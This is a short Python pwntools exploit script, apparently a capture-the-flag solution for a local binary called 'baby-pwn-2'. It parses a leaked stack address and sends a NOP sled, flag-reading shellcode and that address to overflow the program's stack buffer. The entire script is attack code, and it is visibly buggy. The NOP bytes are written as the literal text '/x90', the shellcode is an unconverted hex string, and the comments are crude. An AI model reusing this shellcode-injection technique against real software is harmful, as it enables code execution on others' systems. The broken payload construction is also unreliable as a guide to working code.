from pwn import *
import sys

""" | NOPS | SHELLCODE | POTENTIAL BUFFER | LEAKED ADRESS OF THE STACK | """
''' |      72 <= N                        | '''

p = process('./baby-pwn-2')

""" 
for x in sys.stdin:
    if "Stack address leak:" == x.lstrip(): SYS is ass bruh.
        break
"""
output = p.recv()

listed = []
i = 0
output = output.decode('utf-8')
for x in output:
    listed.append(x)
    
#bby = sys.stdin.read()
#bby = bby.decode('utf-8') NEVER USE SYS
# print(listed[57:71]) # Extract the fucking adress
address = ""
for x in listed[57:71]:
    address += x
print(address) #UR ADDRESS IS MINE PROGRAMM, BBY PWN 2
	

""" for i, char in enumerate(bby):
    print(f"{char}") """ 


#oof = sys.stdin.read()


nops = 18 * b"/x90" #NOPS

shellcode = b"b0024831f64831d2525241b274415249ba2f666c61672e74784152488d3c240f054088c6bf01000000b0284831d241ba000100000f05" #54 Bytes #Need to convert this to Hex Instructions.

finished = (int(address,16))
# Fucntion needed to extract parsed Element: print(hex(int(ADRESS,16)))
exploit = nops + shellcode + p64(finished)

p.sendline(exploit)
print(p.recv())

